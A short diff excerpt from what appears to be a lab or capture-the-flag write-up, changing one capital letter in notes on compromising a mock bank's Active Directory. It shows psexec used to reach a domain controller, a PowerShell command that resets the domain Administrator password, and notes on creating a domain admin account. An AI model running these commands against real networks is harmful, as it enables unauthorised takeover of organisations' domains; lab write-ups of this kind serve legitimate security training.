@@ -15,4 +15,4 @@ PS C:\Users\Administrator>`.\psexec.exe \\bankdc.bank.thereserve.loc cmd.exe -ac
 
 C:\Windows\system32>`powershell.exe -c Set-ADAccountPassword -Identity "Administrator" -NewPassword (ConvertTo-SecureString -AsPlainText "Hacker@123" -Force) -Reset`
 
-rdp into ROOTDC with the new creds.. created a domain admin user for BankDC. Rdp into BankDC.
+Rdp into ROOTDC with the new creds.. created a domain admin user for BankDC. Rdp into BankDC.
